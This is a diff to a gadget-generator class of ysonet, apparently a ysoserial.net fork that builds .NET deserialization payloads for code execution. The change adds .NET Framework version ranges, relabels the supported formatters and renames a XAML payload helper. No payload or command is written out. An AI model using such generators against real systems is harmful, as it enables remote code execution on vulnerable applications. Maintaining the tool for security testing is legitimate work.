@@ -18,14 +18,19 @@ namespace ysonet.Generators
         {
             return new GadgetFacetSet()
                 .WithKinds(PayloadKind.CodeExecution)
-                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework);
+                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
+                // fired on 4.8.1
+                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
         }
 
         private int internalgadget = 1; // Default
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };
+            // The "(N)" suffix is a display-only annotation meaning "this formatter
+            // carries N variants". Every formatter branches on both internal gadgets
+            // (the ig option, see Variants()).
+            return new List<string> { "BinaryFormatter (2)", "NetDataContractSerializer (2)", "LosFormatter (2)" };
         }
 
         public override string Finders()
@@ -43,7 +48,11 @@ namespace ysonet.Generators
                     .WithFacets(new GadgetFacetSet()
                         .WithKinds(PayloadKind.CodeExecution)
                         .WithRequirements(GadgetRequirement.ExtraAssembly, GadgetRequirement.Wpf,
-                            GadgetRequirement.NetFramework))
+                            GadgetRequirement.NetFramework)
+                        // An override replaces the whole set, so repeat the versions.
+                        // This variant's TextFormattingRunProperties inner carries no
+                        // 4.5-era container, so it keeps the CLR v4 floor.
+                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481)))
             };
         }
 
@@ -129,7 +138,7 @@ namespace ysonet.Generators
                     // In this gadget however, this feels like cheating as System.Resources.ResourceSet can be replaced by anything given the TextFormattingRunProperties gadget triggers first
                     ObjectDataProviderGenerator myObjectDataProviderGenerator = new ObjectDataProviderGenerator();
 
-                    string xaml_payload = myObjectDataProviderGenerator.GenerateWithNoTest("xaml", inputArgs).ToString();
+                    string xaml_payload = myObjectDataProviderGenerator.GenerateInner("xaml", inputArgs).ToString();
 
                     if (inputArgs.Minify)
                     {
@@ -319,7 +328,7 @@ namespace ysonet.Generators
                 {
                     ObjectDataProviderGenerator myObjectDataProviderGenerator = new ObjectDataProviderGenerator();
 
-                    string xaml_payload = myObjectDataProviderGenerator.GenerateWithNoTest("xaml", inputArgs).ToString();
+                    string xaml_payload = myObjectDataProviderGenerator.GenerateInner("xaml", inputArgs).ToString();
 
                     if (inputArgs.Minify)
                     {
